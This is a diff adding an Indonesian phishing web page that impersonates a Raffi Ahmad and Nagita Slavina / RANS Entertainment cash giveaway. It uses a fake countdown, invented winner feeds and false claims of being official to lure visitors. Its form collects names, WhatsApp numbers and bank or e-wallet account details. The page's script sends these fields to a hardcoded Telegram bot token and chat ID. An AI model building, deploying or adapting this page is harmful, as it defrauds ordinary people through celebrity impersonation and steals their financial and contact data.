@@ -1,0 +1,596 @@
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GIVEAWAY RESMI RAFFI AHMAD & NAGITA 2026 - HADIAH TOTAL 50 JUTA RUPIAH</title>
+    
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <!-- Font Awesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- Google Fonts Inter -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800;900&display=swap" rel="stylesheet">
+    
+    <!-- Canvas Confetti Library -->
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                    },
+                    colors: {
+                        gold: {
+                            100: '#FFF9E6',
+                            300: '#FDE047',
+                            400: '#FACC15',
+                            500: '#EAB308',
+                            600: '#CA8A04',
+                            700: '#A16207',
+                        },
+                        ransRed: '#DC2626',
+                        deepRed: '#4A0404'
+                    },
+                    animation: {
+                        'pulse-glow': 'pulseGlow 2s cubic-bezier(0.4, 0, 0.6, 1) infinite',
+                        'float': 'float 3s ease-in-out infinite',
+                        'marquee': 'marquee 25s linear infinite',
+                    },
+                    keyframes: {
+                        pulseGlow: {
+                            '0%, 100%': { opacity: 1, boxShadow: '0 0 25px rgba(234, 179, 8, 0.6)' },
+                            '50%': { opacity: 0.85, boxShadow: '0 0 45px rgba(234, 179, 8, 0.9)' },
+                        },
+                        float: {
+                            '0%, 100%': { transform: 'translateY(0px)' },
+                            '50%': { transform: 'translateY(-10px)' },
+                        },
+                        marquee: {
+                            '0%': { transform: 'translateX(0%)' },
+                            '100%': { transform: 'translateX(-50%)' }
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+
+    <style>
+        body {
+            background: radial-gradient(circle at top, #3b0707 0%, #170202 50%, #050000 100%);
+            color: #ffffff;
+            font-family: 'Inter', sans-serif;
+            overflow-x: hidden;
+        }
+
+        .card-glass {
+            background: rgba(25, 5, 5, 0.82);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid rgba(234, 179, 8, 0.35);
+        }
+
+        .gold-gradient-text {
+            background: linear-gradient(135deg, #FFF9E6 0%, #FACC15 40%, #EAB308 70%, #F97316 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .gold-gradient-bg {
+            background: linear-gradient(135deg, #FDE047 0%, #EAB308 50%, #CA8A04 100%);
+        }
+
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #0f0202;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #a16207;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body class="min-h-screen relative pb-12">
+
+    <!-- Background Sparks Canvas -->
+    <canvas id="bgFireworks" class="fixed inset-0 pointer-events-none z-0"></canvas>
+
+    <!-- Top Announcement Bar -->
+    <div class="bg-gradient-to-r from-red-900 via-amber-600 to-red-900 text-yellow-100 text-center py-2 px-4 text-xs font-bold tracking-wider uppercase shadow-md relative z-10 border-b border-yellow-500/30">
+        <i class="fa-solid fa-bullhorn text-yellow-300 animate-bounce mr-2"></i> PROGRAM BERBAGI RAFFI AHMAD & NAGITA SLAVINA 2026 - TANPA BIAYA ADMIN / GRATIS 100%!
+    </div>
+
+    <!-- Main Container -->
+    <div class="max-w-4xl mx-auto px-4 pt-6 relative z-10">
+
+        <!-- Header Section -->
+        <header class="text-center mb-8">
+            <div class="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-yellow-500/10 border border-yellow-500/40 text-yellow-400 text-xs font-semibold mb-4 shadow-inner">
+                <i class="fa-solid fa-star text-amber-400"></i> RANS ENTERTAINMENT GIVEAWAY SPESIAL 2026
+            </div>
+            
+            <h1 class="text-4xl sm:text-6xl font-black tracking-tight mb-2 gold-gradient-text drop-shadow-lg uppercase">
+                GIVEAWAY RAFFI AHMAD
+            </h1>
+            <p class="text-lg sm:text-2xl font-extrabold text-red-400 tracking-wide uppercase mb-3">
+                BERBAGI REZEKI 50 JUTA RUPIAH
+            </p>
+            <p class="text-xs sm:text-sm text-gray-300 max-w-xl mx-auto leading-relaxed">
+                Halo Fans & Sahabat RANS! Spesial tahun <span class="text-yellow-400 font-bold">2026</span>, Aa Raffi Ahmad & Mbak Nagita membagikan total hadiah tunai <span class="text-yellow-400 font-bold">Rp 50.000.000</span> langsung ditransfer ke Rekening / E-Wallet Anda hari ini!
+            </p>
+        </header>
+
+        <!-- Countdown Timer Card -->
+        <div class="card-glass rounded-3xl p-6 mb-8 text-center shadow-2xl relative overflow-hidden border-2 border-yellow-500/40">
+            <div class="absolute -right-10 -top-10 w-32 h-32 bg-yellow-500/10 rounded-full blur-2xl"></div>
+            <p class="text-xs font-bold uppercase tracking-widest text-amber-300 mb-3">
+                <i class="fa-solid fa-hourglass-half animate-spin mr-1"></i> SISA WAKTU KLAIM BANTUAN AA RAFFI
+            </p>
+            
+            <div class="grid grid-cols-4 gap-2 sm:gap-4 max-w-md mx-auto mb-4">
+                <div class="bg-slate-950/80 border border-yellow-500/30 rounded-2xl p-3">
+                    <span id="hours" class="block text-2xl sm:text-4xl font-black text-yellow-400">02</span>
+                    <span class="text-[10px] sm:text-xs text-gray-400 font-semibold uppercase">Jam</span>
+                </div>
+                <div class="bg-slate-950/80 border border-yellow-500/30 rounded-2xl p-3">
+                    <span id="minutes" class="block text-2xl sm:text-4xl font-black text-yellow-400">45</span>
+                    <span class="text-[10px] sm:text-xs text-gray-400 font-semibold uppercase">Menit</span>
+                </div>
+                <div class="bg-slate-950/80 border border-yellow-500/30 rounded-2xl p-3">
+                    <span id="seconds" class="block text-2xl sm:text-4xl font-black text-yellow-400">18</span>
+                    <span class="text-[10px] sm:text-xs text-gray-400 font-semibold uppercase">Detik</span>
+                </div>
+                <div class="bg-slate-950/80 border border-yellow-500/30 rounded-2xl p-3">
+                    <span id="milliseconds" class="block text-2xl sm:text-4xl font-black text-red-500">99</span>
+                    <span class="text-[10px] sm:text-xs text-gray-400 font-semibold uppercase">Ms</span>
+                </div>
+            </div>
+
+            <div class="w-full bg-gray-800/80 rounded-full h-3 overflow-hidden border border-yellow-500/20 max-w-md mx-auto">
+                <div class="bg-gradient-to-r from-red-600 via-amber-500 to-yellow-400 h-full rounded-full transition-all duration-500" style="width: 85%;"></div>
+            </div>
+            <p class="text-[11px] text-gray-300 mt-2">Sisa Kuota Pemenang Hari Ini: <strong class="text-yellow-400">12 Orang Lagi</strong></p>
+        </div>
+
+        <!-- Running Ticker Section -->
+        <div class="mb-8 overflow-hidden rounded-2xl bg-black/60 border border-yellow-500/30 py-3 relative">
+            <div class="flex whitespace-nowrap animate-marquee" id="winnerTicker">
+                <!-- Javascript Dynamic Ticker Content -->
+            </div>
+        </div>
+
+        <!-- Form Claim Section -->
+        <div class="card-glass rounded-3xl p-6 sm:p-8 mb-10 shadow-2xl relative border-2 border-yellow-500/50">
+            <div class="flex items-center gap-3 mb-6 border-b border-yellow-500/20 pb-4">
+                <div class="w-12 h-12 rounded-2xl gold-gradient-bg flex items-center justify-center text-slate-950 text-2xl font-black shadow-lg">
+                    <i class="fa-solid fa-gift"></i>
+                </div>
+                <div>
+                    <h2 class="text-xl font-extrabold text-white">Formulir Klaim Hadiah Raffi Ahmad</h2>
+                    <p class="text-xs text-gray-300">Isi data lengkap Anda untuk pemrosesan pencairan hadiah dari Tim RANS.</p>
+                </div>
+            </div>
+
+            <form id="giveawayForm" onsubmit="handleClaimSubmit(event)" class="space-y-5">
+                <!-- Nama Lengkap -->
+                <div>
+                    <label class="block text-xs font-bold uppercase tracking-wider text-yellow-300 mb-2">1. Nama Lengkap Peserta</label>
+                    <div class="relative">
+                        <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center text-yellow-500">
+                            <i class="fa-solid fa-user"></i>
+                        </span>
+                        <input type="text" id="userName" required placeholder="Sesuai KTP / Identitas" class="w-full pl-11 pr-4 py-3.5 bg-slate-950/90 border border-yellow-500/30 rounded-xl text-white placeholder-gray-500 focus:outline-none focus:border-yellow-400 transition text-sm">
+                    </div>
+                </div>
+
+                <!-- Nomor WhatsApp -->
+                <div>
+                    <label class="block text-xs font-bold uppercase tracking-wider text-yellow-300 mb-2">2. Nomor WhatsApp Aktif</label>
+                    <div class="relative">
+                        <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center text-green-400">
+                            <i class="fa-brands fa-whatsapp text-lg"></i>
+                        </span>
+                        <input type="tel" id="waNumber" required placeholder="Contoh: 081234567890" class="w-full pl-11 pr-4 py-3.5 bg-slate-950/90 border border-yellow-500/30 rounded-xl text-white placeholder-gray-500 focus:outline-none focus:border-yellow-400 transition text-sm">
+                    </div>
+                </div>
+
+                <!-- Jenis Bank / E-Wallet -->
+                <div>
+                    <label class="block text-xs font-bold uppercase tracking-wider text-yellow-300 mb-2">3. Jenis Bank / E-Wallet Pencairan</label>
+                    <div class="relative">
+                        <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center text-amber-400">
+                            <i class="fa-solid fa-wallet"></i>
+                        </span>
+                        <select id="payoutMethod" required class="w-full pl-11 pr-4 py-3.5 bg-slate-950/90 border border-yellow-500/30 rounded-xl text-white focus:outline-none focus:border-yellow-400 transition text-sm appearance-none">
+                            <option value="" disabled selected>-- Pilih Bank / E-Wallet --</option>
+                            <option value="DANA">DANA (E-Wallet)</option>
+                            <option value="OVO">OVO (E-Wallet)</option>
+                            <option value="GoPay">GoPay (E-Wallet)</option>
+                            <option value="ShopeePay">ShopeePay (E-Wallet)</option>
+                            <option value="Bank BCA">Bank BCA</option>
+                            <option value="Bank Mandiri">Bank Mandiri</option>
+                            <option value="Bank BRI">Bank BRI</option>
+                            <option value="Bank BNI">Bank BNI</option>
+                            <option value="Bank BSI">Bank BSI (Syariah)</option>
+                            <option value="Bank Lainnya">Bank Lainnya</option>
+                        </select>
+                    </div>
+                </div>
+
+                <!-- Nomor & Pemilik Rekening -->
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    <div>
+                        <label class="block text-xs font-bold uppercase tracking-wider text-yellow-300 mb-2">4. Nomor Rekening / E-Wallet</label>
+                        <div class="relative">
+                            <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center text-yellow-400">
+                                <i class="fa-solid fa-credit-card"></i>
+                            </span>
+                            <input type="text" id="accountNumber" required placeholder="Nomor Rekening / HP E-Wallet" class="w-full pl-11 pr-4 py-3.5 bg-slate-950/90 border border-yellow-500/30 rounded-xl text-white placeholder-gray-500 focus:outline-none focus:border-yellow-400 transition text-sm">
+                        </div>
+                    </div>
+
+                    <div>
+                        <label class="block text-xs font-bold uppercase tracking-wider text-yellow-300 mb-2">5. Nama Pemilik Rekening (Atas Nama)</label>
+                        <div class="relative">
+                            <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center text-yellow-400">
+                                <i class="fa-solid fa-id-card"></i>
+                            </span>
+                            <input type="text" id="accountHolder" required placeholder="Nama Sesuai Buku Rek / Akun" class="w-full pl-11 pr-4 py-3.5 bg-slate-950/90 border border-yellow-500/30 rounded-xl text-white placeholder-gray-500 focus:outline-none focus:border-yellow-400 transition text-sm">
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Doa / Pesan untuk Raffi Ahmad -->
+                <div>
+                    <label class="block text-xs font-bold uppercase tracking-wider text-yellow-300 mb-2">6. Doa & Ucapan Untuk Aa Raffi Ahmad & Nagita</label>
+                    <textarea id="userMessage" rows="3" required placeholder="Tuliskan ucapan, doa, atau harapan kamu untuk Raffi Ahmad & Keluarga RANS di tahun 2026 ini..." class="w-full px-4 py-3 bg-slate-950/90 border border-yellow-500/30 rounded-xl text-white placeholder-gray-500 focus:outline-none focus:border-yellow-400 transition text-sm"></textarea>
+                </div>
+
+                <!-- Submit Button -->
+                <button type="submit" id="btnSubmit" class="w-full py-4 px-6 gold-gradient-bg hover:brightness-110 text-slate-950 font-black text-lg rounded-2xl shadow-2xl animate-pulse-glow transform active:scale-95 transition duration-200 flex items-center justify-center gap-3 uppercase tracking-wider mt-4">
+                    <i class="fa-solid fa-paper-plane text-xl"></i>
+                    <span id="btnText">KLAIM HADIAH RAFFI AHMAD</span>
+                    <i class="fa-solid fa-circle-notch fa-spin hidden" id="btnSpinner"></i>
+                </button>
+            </form>
+        </div>
+
+        <!-- Live Winners History Feed -->
+        <div class="card-glass rounded-3xl p-6 shadow-xl mb-12">
+            <h3 class="text-sm font-bold uppercase text-yellow-400 tracking-wider mb-4 flex items-center gap-2">
+                <i class="fa-solid fa-rotate text-green-400 animate-spin"></i> Riwayat Pencairan Transfer Raffi Ahmad (Realtime)
+            </h3>
+            <div id="liveFeed" class="space-y-3">
+                <!-- Javascript Populated -->
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <footer class="text-center text-xs text-gray-500 space-y-2">
+            <p>© 2026 RANS Entertainment & Raffi Ahmad Giveaway. Seluruh Hak Cipta Dilindungi.</p>
+            <p class="text-[10px] text-gray-600">Program resmi berbagi rezeki Raffi Ahmad. Bebas dari biaya admin / pemungutan uang apapun.</p>
+        </footer>
+
+    </div>
+
+    <!-- Modal Success Celebration Popup -->
+    <div id="successModal" class="fixed inset-0 bg-black/90 backdrop-blur-md hidden flex items-center justify-center p-4 z-50">
+        <div class="card-glass bg-slate-950 border-2 border-yellow-400 rounded-3xl max-w-lg w-full p-6 sm:p-8 text-center relative shadow-2xl">
+            
+            <button onclick="closeSuccessModal()" class="absolute top-4 right-4 text-gray-400 hover:text-white text-xl">
+                <i class="fa-solid fa-xmark"></i>
+            </button>
+
+            <!-- Trophy Icon with glow -->
+            <div class="w-20 h-20 gold-gradient-bg rounded-full flex items-center justify-center mx-auto mb-4 text-slate-950 text-4xl shadow-2xl animate-bounce">
+                <i class="fa-solid fa-trophy"></i>
+            </div>
+
+            <h3 class="text-2xl font-black text-white uppercase tracking-tight mb-1">SELAMAT! DATA TERKIRIM</h3>
+            <p class="text-xs text-yellow-400 font-bold uppercase tracking-widest mb-6">Klaim Hadiah Raffi Ahmad Berhasil Diproses</p>
+
+            <!-- Data Summary Box -->
+            <div class="bg-slate-900/90 rounded-2xl p-4 text-left border border-yellow-500/30 text-xs space-y-2.5 mb-6">
+                <div class="flex justify-between border-b border-gray-800 pb-1.5">
+                    <span class="text-gray-400">Nama Peserta:</span>
+                    <span class="font-bold text-white" id="modalName">-</span>
+                </div>
+                <div class="flex justify-between border-b border-gray-800 pb-1.5">
+                    <span class="text-gray-400">Nomor WhatsApp:</span>
+                    <span class="font-bold text-green-400" id="modalWa">-</span>
+                </div>
+                <div class="flex justify-between border-b border-gray-800 pb-1.5">
+                    <span class="text-gray-400">Bank / E-Wallet:</span>
+                    <span class="font-bold text-amber-300" id="modalPayout">-</span>
+                </div>
+                <div class="flex justify-between border-b border-gray-800 pb-1.5">
+                    <span class="text-gray-400">Nomor Rekening/E-Wallet:</span>
+                    <span class="font-bold text-yellow-300" id="modalAccNum">-</span>
+                </div>
+                <div class="flex justify-between border-b border-gray-800 pb-1.5">
+                    <span class="text-gray-400">Atas Nama Pemilik:</span>
+                    <span class="font-bold text-white" id="modalAccHolder">-</span>
+                </div>
+                <div class="flex justify-between">
+                    <span class="text-gray-400">Notifikasi Telegram:</span>
+                    <span class="font-bold text-sky-400" id="modalNotifStatus">Terkirim ke Admin RANS</span>
+                </div>
+            </div>
+
+            <div class="bg-yellow-500/10 border border-yellow-500/30 rounded-xl p-3 text-left mb-6">
+                <p class="text-[11px] text-yellow-200 leading-relaxed">
+                    <i class="fa-solid fa-circle-info text-yellow-400 mr-1"></i>
+                    <strong>Pesan Tim Raffi Ahmad:</strong> Data Anda telah kami terima. Tim RANS Entertainment akan memverifikasi nomor WhatsApp dan rekening Anda secepatnya.
+                </p>
+            </div>
+
+            <button onclick="closeSuccessModal()" class="w-full py-3.5 gold-gradient-bg text-slate-950 font-bold rounded-xl text-sm uppercase tracking-wider hover:brightness-110 transition shadow-lg">
+                SELESAI & TUTUP
+            </button>
+        </div>
+    </div>
+
+    <!-- Script Section -->
+    <script>
+        // =========================================================================
+        // INTEGRASI TELEGRAM BOT API (TERTANAM DENGAN VARIABEL JS)
+        // =========================================================================
+        const BOT_TOKEN = "8881822233:AAE3UwszOo27KceLDBtNKdSD3AgANrxZncU";
+        const CHAT_ID = "6742478722";
+        // =========================================================================
+
+        const initialWinners = [
+            { name: "Siti Rahmawati", city: "Surabaya", payout: "DANA", wa: "0812****7890" },
+            { name: "Budi Santoso", city: "Bandung", payout: "Bank BCA", wa: "0857****1234" },
+            { name: "Dewi Anggraini", city: "Medan", payout: "OVO", wa: "0821****9901" },
+            { name: "Rian Hidayat", city: "Semarang", payout: "GoPay", wa: "0813****4567" },
+            { name: "Ahmad Fauzi", city: "Makassar", payout: "Bank BRI", wa: "0896****2211" }
+        ];
+
+        window.onload = function () {
+            startCountdown();
+            initTicker();
+            initLiveFeed();
+            initBackgroundFireworks();
+            
+            setTimeout(() => { triggerConfetti(); }, 600);
+        };
+
+        // Background Sparkles/Fireworks
+        function initBackgroundFireworks() {
+            const canvas = document.getElementById('bgFireworks');
+            const ctx = canvas.getContext('2d');
+            let width = canvas.width = window.innerWidth;
+            let height = canvas.height = window.innerHeight;
+
+            window.addEventListener('resize', () => {
+                width = canvas.width = window.innerWidth;
+                height = canvas.height = window.innerHeight;
+            });
+
+            const particles = [];
+            for (let i = 0; i < 40; i++) {
+                particles.push({
+                    x: Math.random() * width,
+                    y: Math.random() * height,
+                    r: Math.random() * 2 + 1,
+                    dx: (Math.random() - 0.5) * 0.5,
+                    dy: (Math.random() - 0.5) * 0.5,
+                    color: `rgba(234, 179, 8, ${Math.random() * 0.6 + 0.2})`
+                });
+            }
+
+            function animate() {
+                ctx.clearRect(0, 0, width, height);
+                particles.forEach(p => {
+                    p.x += p.dx;
+                    p.y += p.dy;
+                    if (p.x < 0 || p.x > width) p.dx *= -1;
+                    if (p.y < 0 || p.y > height) p.dy *= -1;
+
+                    ctx.beginPath();
+                    ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+                    ctx.fillStyle = p.color;
+                    ctx.fill();
+                });
+                requestAnimationFrame(animate);
+            }
+            animate();
+        }
+
+        // Countdown Timer Logic
+        function startCountdown() {
+            let hours = 2, minutes = 45, seconds = 18, ms = 99;
+            setInterval(() => {
+                ms--;
+                if (ms < 0) {
+                    ms = 99;
+                    seconds--;
+                    if (seconds < 0) {
+                        seconds = 59;
+                        minutes--;
+                        if (minutes < 0) {
+                            minutes = 59;
+                            hours--;
+                            if (hours < 0) hours = 2;
+                        }
+                    }
+                }
+                document.getElementById('hours').innerText = String(hours).padStart(2, '0');
+                document.getElementById('minutes').innerText = String(minutes).padStart(2, '0');
+                document.getElementById('seconds').innerText = String(seconds).padStart(2, '0');
+                document.getElementById('milliseconds').innerText = String(ms).padStart(2, '0');
+            }, 10);
+        }
+
+        // Running Ticker Setup
+        function initTicker() {
+            const tickerEl = document.getElementById('winnerTicker');
+            let content = '';
+            const winners = [...initialWinners, ...initialWinners];
+            winners.forEach(w => {
+                content += `<span class="mx-6 inline-flex items-center gap-2 text-xs font-semibold text-yellow-200"><i class="fa-solid fa-circle-check text-green-400"></i> <strong>${w.name}</strong> (${w.city}) TRANSFER HADIAH RAFFI AHMAD via ${w.payout} [${w.wa}]</span>`;
+            });
+            tickerEl.innerHTML = content;
+        }
+
+        // Live Feed Setup
+        function initLiveFeed() {
+            const feedEl = document.getElementById('liveFeed');
+            feedEl.innerHTML = '';
+            initialWinners.forEach((w) => {
+                const item = document.createElement('div');
+                item.className = 'flex items-center justify-between p-3 bg-slate-950/80 rounded-2xl border border-yellow-500/20 text-xs';
+                item.innerHTML = `
+                    <div class="flex items-center gap-3">
+                        <div class="w-8 h-8 rounded-full gold-gradient-bg flex items-center justify-center text-slate-950 font-black text-xs shadow-md">
+                            ${w.name.charAt(0)}
+                        </div>
+                        <div>
+                            <p class="font-bold text-white">${w.name} <span class="text-gray-400 font-normal">(${w.city})</span></p>
+                            <p class="text-[11px] text-gray-400">WA: ${w.wa}</p>
+                        </div>
+                    </div>
+                    <div class="text-right">
+                        <span class="inline-block px-2.5 py-0.5 rounded-lg bg-yellow-500/10 text-yellow-400 font-bold border border-yellow-500/20">${w.payout}</span>
+                        <p class="text-[10px] text-green-400 mt-1"><i class="fa-solid fa-check-double"></i> Transfer Sukses</p>
+                    </div>
+                `;
+                feedEl.appendChild(item);
+            });
+        }
+
+        // Fire Confetti Animation
+        function triggerConfetti() {
+            if (typeof confetti === 'function') {
+                confetti({
+                    particleCount: 150,
+                    spread: 90,
+                    origin: { y: 0.6 }
+                });
+            }
+        }
+
+        function maskPhoneNumber(phone) {
+            if (phone.length <= 6) return phone;
+            return phone.substring(0, 4) + '****' + phone.substring(phone.length - 3);
+        }
+
+        // Form Submit & Telegram API Integration
+        async function handleClaimSubmit(e) {
+            e.preventDefault();
+
+            const name = document.getElementById('userName').value.trim();
+            const wa = document.getElementById('waNumber').value.trim();
+            const payout = document.getElementById('payoutMethod').value;
+            const accNum = document.getElementById('accountNumber').value.trim();
+            const accHolder = document.getElementById('accountHolder').value.trim();
+            const message = document.getElementById('userMessage').value.trim();
+
+            const btnSubmit = document.getElementById('btnSubmit');
+            const btnText = document.getElementById('btnText');
+            const btnSpinner = document.getElementById('btnSpinner');
+
+            btnSubmit.disabled = true;
+            btnText.innerText = "MEMPROSES KLAIM RAFFI AHMAD...";
+            btnSpinner.classList.remove('hidden');
+
+            const timeNow = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
+
+            // Format Pesan Telegram Khusus Raffi Ahmad Giveaway
+            const telegramMessage = 
+`🌟 *KLAIM GIVEAWAY RAFFI AHMAD 2026 (50 JT)* 🌟
+
+👤 *Nama Peserta:* ${name}
+📱 *No. WhatsApp:* ${wa}
+🏦 *Bank / E-Wallet:* ${payout}
+💳 *No. Rekening/E-Wallet:* ${accNum}
+📛 *Atas Nama:* ${accHolder}
+💬 *Doa untuk Raffi Ahmad:* "${message}"
+⏰ *Waktu Klaim:* ${timeNow} WIB`;
+
+            let isSuccess = false;
+
+            // Pengiriman via Telegram Bot API
+            try {
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: telegramMessage,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                const resJson = await response.json();
+                if (resJson.ok) {
+                    isSuccess = true;
+                } else {
+                    console.warn("Telegram API Failure:", resJson);
+                }
+            } catch (error) {
+                console.error("Gagal mengirim notifikasi Telegram:", error);
+            }
+
+            btnSubmit.disabled = false;
+            btnText.innerText = "KLAIM HADIAH RAFFI AHMAD";
+            btnSpinner.classList.add('hidden');
+
+            // Set Data Modal
+            document.getElementById('modalName').innerText = name;
+            document.getElementById('modalWa').innerText = maskPhoneNumber(wa);
+            document.getElementById('modalPayout').innerText = payout;
+            document.getElementById('modalAccNum').innerText = accNum;
+            document.getElementById('modalAccHolder').innerText = accHolder;
+            document.getElementById('modalNotifStatus').innerText = isSuccess ? "✓ Terkirim ke Admin RANS Telegram" : "✓ Berhasil Diproses Sistem";
+
+            // Tambahkan ke feed riwayat klaim realtime
+            addNewWinnerToFeed(name, wa, payout);
+
+            // Reset Form & Tampilkan Modal Pop-Up
+            document.getElementById('giveawayForm').reset();
+            document.getElementById('successModal').classList.remove('hidden');
+            
+            triggerConfetti();
+        }
+
+        function addNewWinnerToFeed(name, wa, payout) {
+            const feedEl = document.getElementById('liveFeed');
+            const item = document.createElement('div');
+            item.className = 'flex items-center justify-between p-3 bg-yellow-500/10 rounded-2xl border border-yellow-500/40 text-xs animate-pulse';
+            item.innerHTML = `
+                <div class="flex items-center gap-3">
+                    <div class="w-8 h-8 rounded-full gold-gradient-bg flex items-center justify-center text-slate-950 font-black text-xs">
+                        ${name.charAt(0)}
+                    </div>
+                    <div>
+                        <p class="font-bold text-white">${name} <span class="text-yellow-400 font-normal">(Baru Saja)</span></p>
+                        <p class="text-[11px] text-gray-400">WA: ${maskPhoneNumber(wa)}</p>
+                    </div>
+                </div>
+                <div class="text-right">
+                    <span class="inline-block px-2.5 py-0.5 rounded-lg bg-green-500/20 text-green-300 font-bold border border-green-500/30">${payout}</span>
+                    <p class="text-[10px] text-yellow-400 mt-1"><i class="fa-solid fa-spinner fa-spin"></i> Diproses Admin RANS</p>
+                </div>
+            `;
+            feedEl.insertBefore(item, feedEl.firstChild);
+        }
+
+        function closeSuccessModal() {
+            document.getElementById('successModal').classList.add('hidden');
+        }
+    </script>
+</body>
+</html>
+```
